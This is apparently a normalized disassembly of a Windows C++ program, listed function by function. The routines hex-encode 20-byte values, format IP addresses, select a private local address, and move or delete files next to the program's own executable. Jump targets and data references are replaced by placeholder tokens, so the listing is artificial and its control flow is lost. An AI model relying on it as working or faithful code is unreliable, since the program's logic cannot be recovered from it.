call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x64 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x58 ]
mov [ esp + 0x4 ] 0x1
pop ebx
call sub_42e72f
add esp 0x64
retn
sub_429eb0
push 0xffffffff
push sub_43309a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
mov eax [ rw-data ]
push ebx
xor edx edx
mov [ esp + 0x4 ] edx
push esi
mov esi [ esp + 0x74 ]
mov [ esp + 0x5c ] eax
push edi
mov [ esp + 0x10 ] 0x30
mov [ esp + 0x11 ] 0x31
mov [ esp + 0x12 ] 0x32
mov [ esp + 0x13 ] 0x33
mov [ esp + 0x14 ] 0x34
mov [ esp + 0x15 ] 0x35
mov [ esp + 0x16 ] 0x36
mov [ esp + 0x17 ] 0x37
mov [ esp + 0x18 ] 0x38
mov [ esp + 0x19 ] 0x39
mov [ esp + 0x1a ] 0x61
mov [ esp + 0x1b ] 0x62
mov [ esp + 0x1c ] 0x63
mov [ esp + 0x1d ] 0x64
mov [ esp + 0x1e ] 0x65
mov [ esp + 0x1f ] 0x66
xor eax eax
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x21 ] cl
movzx ecx [ esi + eax + 0x1 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x22 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x23 ] cl
movzx ecx [ esi + eax + 0x2 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x24 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x25 ] cl
movzx ecx [ esi + eax + 0x3 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x26 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x27 ] cl
movzx ecx [ esi + eax + 0x4 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x28 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x29 ] cl
add eax 0x5
cmp eax 0x14
jb r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
movzx ecx [ esi + eax ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x20 ] bl
jns r-xdata
mov esi [ esp + 0x74 ]
mov [ esp + eax * 2 + 0x20 ] dl
lea edx [ esp + 0x20 ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x64 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x58 ]
mov [ esp + 0x4 ] 0x1
pop ebx
call sub_42e72f
add esp 0x64
retn
sub_42a040
push 0xffffffff
push sub_4330ca
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi [ esp + 0x1c ]
mov ecx esi
mov [ esp + 0x4 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
cmp eax 0x14
jne r-xdata
mov esi [ esp + 0x18 ]
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429d20
add esp 0x8
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a0c0
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
lea esp [ esp ]
cmp al 0x61
jl r-xdata
cmp al 0x39
jg r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jg r-xdata
movsx eax al
sub eax 0x30
jmp r-xdata
xor eax eax
cmp al 0x46
jg r-xdata
movsx eax al
sub eax 0x57
jmp r-xdata
mov cl [ edx + 0x1 ]
cmp cl 0x30
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
movsx eax al
sub eax 0x37
jmp r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
xor ecx ecx
cmp cl 0x46
jg r-xdata
movsx ecx cl
sub ecx 0x57
jmp r-xdata
shl al 0x4
add al cl
mov [ esi ] al
mov al [ edx + 0x2 ]
cmp al 0x30
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jg r-xdata
movsx ecx cl
sub ecx 0x37
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jg r-xdata
movsx eax al
sub eax 0x30
jmp r-xdata
xor eax eax
cmp al 0x46
jg r-xdata
movsx eax al
sub eax 0x57
jmp r-xdata
mov cl [ edx + 0x3 ]
cmp cl 0x30
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
movsx eax al
sub eax 0x37
jmp r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
xor ecx ecx
cmp cl 0x46
jg r-xdata
movsx ecx cl
sub ecx 0x57
jmp r-xdata
shl al 0x4
add al cl
mov [ esi + 0x1 ] al
mov al [ edx + 0x4 ]
cmp al 0x30
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jg r-xdata
movsx ecx cl
sub ecx 0x37
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jg r-xdata
movsx eax al
sub eax 0x30
jmp r-xdata
xor eax eax
cmp al 0x46
jg r-xdata
movsx eax al
sub eax 0x57
jmp r-xdata
mov cl [ edx + 0x5 ]
cmp cl 0x30
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
movsx eax al
sub eax 0x37
jmp r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
xor ecx ecx
cmp cl 0x46
jg r-xdata
movsx ecx cl
sub ecx 0x57
jmp r-xdata
shl al 0x4
add al cl
mov [ esi + 0x2 ] al
mov al [ edx + 0x6 ]
cmp al 0x30
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jg r-xdata
movsx ecx cl
sub ecx 0x37
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jg r-xdata
movsx eax al
sub eax 0x30
jmp r-xdata
xor eax eax
cmp al 0x46
jg r-xdata
movsx eax al
sub eax 0x57
jmp r-xdata
mov cl [ edx + 0x7 ]
cmp cl 0x30
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
movsx eax al
sub eax 0x37
jmp r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
xor ecx ecx
cmp cl 0x46
jg r-xdata
movsx ecx cl
sub ecx 0x57
jmp r-xdata
shl al 0x4
add al cl
mov [ esi + 0x3 ] al
mov al [ edx + 0x8 ]
cmp al 0x30
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jg r-xdata
movsx ecx cl
sub ecx 0x37
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x66
jg r-xdata
movsx eax al
sub eax 0x30
jmp r-xdata
xor eax eax
cmp al 0x46
jg r-xdata
movsx eax al
sub eax 0x57
jmp r-xdata
mov cl [ edx + 0x9 ]
cmp cl 0x30
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
movsx eax al
sub eax 0x37
jmp r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
xor ecx ecx
cmp cl 0x46
jg r-xdata
movsx ecx cl
sub ecx 0x57
jmp r-xdata
shl al 0x4
add al cl
mov [ esi + 0x4 ] al
add edi 0x5
add edx 0xa
add esi 0x5
cmp edi 0x14
jb r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
pop edi
pop esi
retn
movsx ecx cl
sub ecx 0x37
jmp r-xdata
sub_42a340
push 0xffffffff
push sub_4330fa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] 0x0
mov eax [ esp + 0x18 ]
push esi
push eax
call [ inet_ntoa@IAT ]
mov esi [ esp + 0x18 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a390
push 0xffffffff
push sub_43312a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
push eax
mov [ esp + 0x8 ] 0x0
call [ inet_ntoa@IAT ]
mov esi [ esp + 0x18 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a4b0
push 0xffffffff
push sub_43315a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
mov [ esp ] 0x0
mov ecx [ eax + 0x4 ]
push esi
push ecx
call [ inet_ntoa@IAT ]
mov esi [ esp + 0x18 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a540
push 0xffffffff
push sub_433185
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call [ exception::exception@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_42a5d0
push 0xffffffff
push sub_4331a5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ exception::~exception@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a630
push 0xffffffff
push sub_4331dc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x424
mov eax [ rw-data ]
push esi
mov [ esp + 0x424 ] eax
push 0x400
lea eax [ esp + 0x28 ]
xor esi esi
push eax
mov [ esp + 0xc ] esi
call [ gethostname@IAT ]
cmp eax 0xffffffff
jne r-xdata
push ebx
lea ecx [ esp + 0x28 ]
push ecx
call [ gethostbyname@IAT ]
mov ebx eax
cmp ebx esi
jne r-xdata
call [ WSAGetLastError@IAT ]
mov esi [ esp + 0x438 ]
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
jmp r-xdata
push ebp
push edi
push r--data
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x43c ] 0x1
mov eax [ ebx + 0xc ]
cmp [ eax ] esi
je r-xdata
call [ WSAGetLastError@IAT ]
mov esi [ esp + 0x43c ]
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x8 ] 0x1
jmp r-xdata
mov ecx [ esp + 0x428 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x424 ]
pop esi
call sub_42e72f
add esp 0x430
retn
lea eax [ esp + 0x14 ]
push eax
mov edi [ inet_ntoa@IAT ]
mov ebp [ inet_addr@IAT ]
pop ebx
mov eax [ ebx + 0xc ]
mov ecx [ esi + eax + 0x4 ]
add esi 0x4
test ecx ecx
jne r-xdata
cmp al 0xac
jne r-xdata
mov eax [ esi + eax ]
mov edx [ eax ]
push edx
call edi
push eax
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call ebp
cmp al 0xa
je r-xdata
cmp al 0xc0
jne r-xdata
cmp ah 0xf
jbe r-xdata
lea eax [ esp + 0x14 ]
push r--data
push eax
call [ ??$?9DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBD@Z@IAT ]
add esp 0x8
test al al
je r-xdata
cmp ah 0xa8
je r-xdata
cmp ah 0x20
jb r-xdata
push 0x0
push r--data
lea ecx [ esp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
lea edx [ esp + 0x14 ]
push edx
jmp r-xdata
mov esi [ esp + 0x448 ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x43c ] 0x0
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop ebp
sub_42a7e0
push 0xffffffff
push sub_43320a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429380
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a830
push 0xffffffff
push sub_43323a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429380
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a880
push 0xffffffff
push sub_43326a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push esi
push eax
mov [ esp + 0x8 ] 0x0
mov esi [ esp + 0x1c ]
push ecx
push esi
call sub_429400
add esp 0xc
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a8d0
push 0xffffffff
push sub_43329a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429480
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a920
push 0xffffffff
push sub_4332ca
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429480
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a970
push 0xffffffff
push sub_4332fa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push esi
push eax
mov [ esp + 0x8 ] 0x0
mov esi [ esp + 0x1c ]
push ecx
push esi
call sub_429500
add esp 0xc
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42a9c0
push 0xffffffff
push sub_43332a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
movsx eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429380
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42aa10
push 0xffffffff
push sub_43335a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
movsx eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429380
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42aa60
push 0xffffffff
push sub_43338a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
movzx eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429480
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42aab0
push 0xffffffff
push sub_4333ba
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
movzx eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_429480
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42ab80
push 0xffffffff
push sub_4333ea
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
xor ecx ecx
mov [ esp ] 0x0
mov cx [ eax + 0x2 ]
push esi
push ecx
call [ ntohs@IAT ]
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_42aab0
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42abe0
push 0xffffffff
push sub_433435
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push esi
mov esi [ esp + 0x70 ]
push edi
lea eax [ esp + 0x44 ]
push esi
push eax
mov [ esp + 0x10 ] 0x0
call sub_42ab80
mov edi eax
mov [ esp + 0x70 ] 0x1
lea ecx [ esp + 0x30 ]
push esi
push ecx
call sub_42a4b0
mov [ esp + 0x78 ] 0x2
push r--data
push eax
lea edx [ esp + 0x24 ]
push edx
call sub_410460
mov [ esp + 0x84 ] 0x3
mov esi [ esp + 0x8c ]
push edi
push eax
push esi
call sub_4102e0
add esp 0x28
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x68 ] 0x2
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x1
lea ecx [ esp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x0
lea ecx [ esp + 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x60 ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x64
retn
sub_42acd0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_433449
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push ebx
push ebp
mov ebp [ esp + 0x68 ]
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
mov ecx ebp
xor edi edi
xor ebx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
mov esi [ esp + 0x10 ]
cmp esi [ eax ]
je r-xdata
mov ecx [ esp + 0x60 ]
mov eax edi
pop edi
pop esi
pop ebp
mov edx ebx
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn
mov al [ esi ]
cmp al 0x30
jl r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x0
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
call sub_42a540
push r--data
lea ecx [ esp + 0x3c ]
push ecx
call _CxxThrowException
cmp al 0x39
jg r-xdata
movsx eax al
push 0x0
sub eax 0x30
cdq
push 0xa
push ebx
mov ecx edx
push edi
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] ecx
call sub_42ead0
mov ecx [ esp + 0x10 ]
add ecx eax
mov eax [ esp + 0x14 ]
adc eax edx
lea edx [ esp + 0x18 ]
mov edi ecx
inc esi
push edx
mov ecx ebp
mov ebx eax
mov [ esp + 0x14 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
mov esi [ esp + 0x10 ]
cmp esi [ eax ]
jne r-xdata
sub_42adc0
push 0xffffffff
push sub_433475
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call [ exception::exception@IAT ]
mov [ esp + 0x14 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_42ae30
push 0xffffffff
push sub_43349a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_42a9c0
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42ae80
push 0xffffffff
push sub_4334ca
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_42aa10
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42aed0
push 0xffffffff
push sub_4334fa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_42aa60
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42af20
push 0xffffffff
push sub_43352a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push eax
push esi
call sub_42aab0
add esp 0x8
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_42afb0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x624
mov eax [ rw-data ]
push ebx
push esi
push edi
mov [ esp + 0x62c ] eax
xor eax eax
xor esi esi
mov [ esp + 0x218 ] si
mov ecx 0x81
lea edi [ esp + 0x21a ]
[ edi ]
mov ecx [ ebp + 0x8 ]
stosw [ edi ]
push 0x104
lea eax [ esp + 0x21c ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
lea edx [ esp + 0x218 ]
push 0x5c
push edx
call [ wcsrchr@IAT ]
add esp 0x8
cmp eax esi
je r-xdata
mov [ esp + 0x10 ] si
mov esi [ wcscpy@IAT ]
xor eax eax
mov ecx 0x81
lea edi [ esp + 0x12 ]
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x218 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call esi
mov ebx [ wcscat@IAT ]
lea edx [ esp + 0x18 ]
push r--data
push edx
call ebx
xor eax eax
mov [ esp + 0x430 ] 0x0
mov ecx 0x81
lea edi [ esp + 0x432 ]
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x228 ]
push eax
lea ecx [ esp + 0x434 ]
push ecx
call esi
lea edx [ esp + 0x438 ]
push r--data
push edx
call ebx
mov esi [ GetFileAttributesW@IAT ]
add esp 0x20
lea eax [ esp + 0x420 ]
push eax
call esi
cmp eax 0xffffffff
je r-xdata
mov [ eax + 0x2 ] si
lea edx [ esp + 0x10 ]
push edx
call esi
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call esi
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x62c ]
xor eax eax
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov esi [ ebp + 0x10 ]
mov edi [ wcslen@IAT ]
lea eax [ esp + 0x10 ]
push eax
dec esi
call edi
add esp 0x4
cmp eax esi
jae r-xdata
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x424 ]
push ecx
call [ MoveFileW@IAT ]
lea edx [ esp + 0x10 ]
push edx
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
mov eax esi
lea ecx [ esp + 0x10 ]
push ecx
call edi
add esp 0x4
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
push eax
mov eax [ ebp + 0xc ]
lea edx [ esp + 0x14 ]
push edx
push eax
call [ wcsncpy@IAT ]
add esp 0xc
mov eax 0x1
mov ecx [ esp + 0x62c ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42b2a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_433558
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24c
mov eax [ rw-data ]
push esi
mov esi ecx
mov [ esp + 0x248 ] eax
cmp [ esi ] 0x0
push edi
jne r-xdata
mov ecx [ esp + 0x254 ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x24c ]
call sub_42e72f
pop edi
pop esi
mov esp ebp
pop ebp
